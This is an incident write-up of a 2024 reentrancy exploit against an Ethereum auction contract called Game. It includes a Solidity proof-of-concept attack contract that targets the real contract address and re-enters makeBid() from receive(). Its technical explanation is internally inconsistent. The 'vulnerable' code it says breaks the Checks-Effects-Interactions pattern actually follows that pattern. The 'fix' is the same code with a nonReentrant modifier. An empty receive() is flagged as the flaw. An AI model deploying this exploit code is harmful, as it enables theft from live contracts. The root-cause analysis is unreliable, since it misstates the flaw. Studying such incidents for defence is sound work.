# Game — Bid Function Reentrancy Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2024-02 |
| **Protocol** | Game |
| **Chain** | Ethereum |
| **Loss** | ~20 ETH |
| **Attacker** | [0x145766a5](https://etherscan.io/address/0x145766a51ae96e69810fe76f6f68fd0e95675a0b) |
| **Attack Contract** | [0x8d4de2bc](https://etherscan.io/address/0x8d4de2bc1a566b266bd4b387f62c21e15474d12a) |
| **Vulnerable Contract** | [Game 0x52d69c67](https://etherscan.io/address/0x52d69c67536f55efefe02941868e5e762538dbd6) |
| **Root Cause** | `makeBid()` does not update state before issuing ETH refunds, allowing 110 reentrant calls via the `receive()` callback |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-02/Game_exp.sol) |

---

## 1. Vulnerability Overview

The `makeBid()` function in the Game contract does not follow the CEI (Checks-Effects-Interactions) pattern when refunding ETH to the previous bidder. The attacker placed an initial bid of 0.6 ETH, then re-entered 110 times from the `receive()` callback by repeatedly sending `newBidEtherMin() + 1 wei`, draining the ETH accumulated in the contract.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: CEI pattern violation — state updated before external call
function makeBid() external payable {
    require(msg.value >= newBidEtherMin(), "bid too low");

    address previousBidder = currentBidder;
    uint256 previousBid    = currentBid;

    // Effects: state update
    currentBidder = msg.sender;
    currentBid    = msg.value;

    // Interactions: refund to previous bidder — reentrancy possible
    if (previousBidder != address(0)) {
        (bool ok,) = previousBidder.call{value: previousBid}("");
        require(ok, "refund failed");
        // ← if previousBidder is a contract, receive() can call makeBid() again
    }
}

// ✅ Safe code: ReentrancyGuard applied
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

function makeBid() external payable nonReentrant {
    require(msg.value >= newBidEtherMin(), "bid too low");
    address previousBidder = currentBidder;
    uint256 previousBid    = currentBid;
    currentBidder = msg.sender;
    currentBid    = msg.value;
    if (previousBidder != address(0)) {
        (bool ok,) = previousBidder.call{value: previousBid}("");
        require(ok, "refund failed");
    }
}
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: Game.sol
contract GameInternal {

    function isWriteEnable() public view returns (bool) {
        return _gameEndTime > 0 && !isGameEnd();
    }

    receive() external payable {}  // ❌ Vulnerability

    function setToken(address tokenAddress) external onlyOwner {
        require(address(token) == address(0));
        token = IERC20(tokenAddress);
    }

    function canvas() external view returns (address) {
        return address(_canvas);
    }

    function writeChunks(ChunkWriteDto[] calldata input) external writeEnable {
        uint256 cost = _writeChunksPrice(input, msg.sender);
        token.transferFrom(msg.sender, address(this), cost);
        for (uint256 i = 0; i < input.length; ++i) {
            _writeChunk(input[i], msg.sender);
        }
    }

    function _writeChunk(ChunkWriteDto calldata input, address writer) private {
        uint16 index = chunkIndex(input.x, input.y);
        ChunkData storage chunk = _chunks[index];

        address lastOwner = chunk.owner;
        if (lastOwner != address(0)) --_ownersShare[lastOwner];
        else ++chunksWritenCount;
        ++_ownersShare[msg.sender];

        chunk.price = _writeChunkPrice(chunk, writer);
        chunk.owner = msg.sender;
        _canvas.setChunkByIndex(index, input.data);

        _gameEndTime += chunkWriteAddsGameSeconds;
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker Contract (holding 0.6 ETH)
  │
  ├─→ [1] Call makeBid() (0.294 ETH = 49% of balance)
  │         └─ currentBidder = attacker, currentBid = 0.294 ETH
  │
  ├─→ [2] Next bidder appears → attempts to refund 0.294 ETH to attacker
  │         └─ receive() callback triggered
  │
  ├─→ [3] Inside receive(): re-call makeBid() (newBidEtherMin() + 1 wei)
  │         └─ Repeated 110 times via reentrancy
  │
  ├─→ [4] Each reentrant call collects a minimum-bid refund
  │
  └─→ [5] Total ~20 ETH drained
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface IGame {
    function newBidEtherMin() external view returns (uint256);
    function makeBid() external payable;
}

contract AttackContract {
    IGame constant game = IGame(0x52d69c67536f55efefe02941868e5e762538dbd6);
    uint256 private count;

    function testExploit() external payable {
        // [1] Initial bid (49% of balance)
        uint256 initialBid = address(this).balance * 49 / 100;
        game.makeBid{value: initialBid}();
    }

    receive() external payable {
        // [2] Re-enter on each refund (up to 110 times)
        if (count < 110 && address(game).balance > 0) {
            count++;
            uint256 minBid = game.newBidEtherMin();
            if (address(this).balance >= minBid + 1) {
                game.makeBid{value: minBid + 1}();  // Re-bid at minimum bid + 1 wei
            }
        }
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Reentrancy Attack |
| **CWE** | CWE-841: Improper Enforcement of Behavioral Workflow |
| **Attack Vector** | External (receive() callback reentrancy) |
| **DApp Category** | Auction/Bid Contract |
| **Impact** | Contract ETH balance drained |

## 6. Remediation Recommendations

1. **Apply ReentrancyGuard**: Block reentrancy using OpenZeppelin's `nonReentrant` modifier
2. **Use Pull Pattern**: Instead of sending refunds immediately, record them in a `pendingRefunds` mapping and allow claimants to withdraw separately
3. **Follow CEI Pattern**: Update all state variables before making any external calls
4. **Bid Locking**: Set a flag to prevent additional bids while a bid is being processed

## 7. Lessons Learned

- Refund logic in auction contracts is a classic reentrancy attack vector.
- Any contract with a `receive()` or `fallback()` function can re-enter when it becomes a bidder.
- All functions involving ETH transfers should apply `nonReentrant` by default.